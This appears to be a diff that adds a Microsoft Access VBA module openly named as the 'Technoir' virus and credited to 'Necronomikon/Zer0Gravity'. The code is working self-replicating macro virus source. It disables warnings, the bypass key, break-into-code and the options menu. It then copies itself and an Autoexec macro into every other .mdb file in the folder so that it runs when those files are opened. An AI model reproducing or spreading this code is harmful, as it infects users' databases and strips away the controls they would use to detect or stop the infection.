@@ -1,0 +1,31 @@
+   Attribute VB_Name = "technoir"
+   Option Compare Database
+   Option Explicit
+
+   Function THC()
+   On Error Resume Next
+   'Virus Name: Technoir
+   'Virus Author: Necronomikon
+   Dim victim, necro, whoami As String
+   DoCmd.SetWarnings (0)
+   Application.SetOption "Show Hidden Objects", False
+   CurrentDb.Properties("AllowBypassKey") = 55 Xor 55
+   CurrentDb.Properties("AllowSpecialKeys") = 44 Xor 44
+   CurrentDb.Properties("AllowBreakIntoCode") = 33 Xor 33
+   CommandBars("Tools").Controls("Optionen...").Enabled = 11 Xor 11
+   necro = False
+   victim = Dir("*.mdb", vbNormal)
+   If victim <> "" Then
+   whoami = CurrentDb.Name
+   If whoami = victim Then necro = True
+   If necro = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", victim, acModule, "technoir", "technoir"
+   If necro = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", victim, acMacro, "Autoexec", "Autoexec "
+   While victim <> ""
+   victim = Dir
+   If whoami = victim Then necro = True
+   If necro = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", victim, acModule, "technoir", "technoir"
+   If necro = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", victim, acMacro, "Autoexec", "Autoexec "
+   Wend
+   MsgBox "Access.Technoir", "(c) by Necronomikon/Zer0Gravity"
+   End If
+   End Function
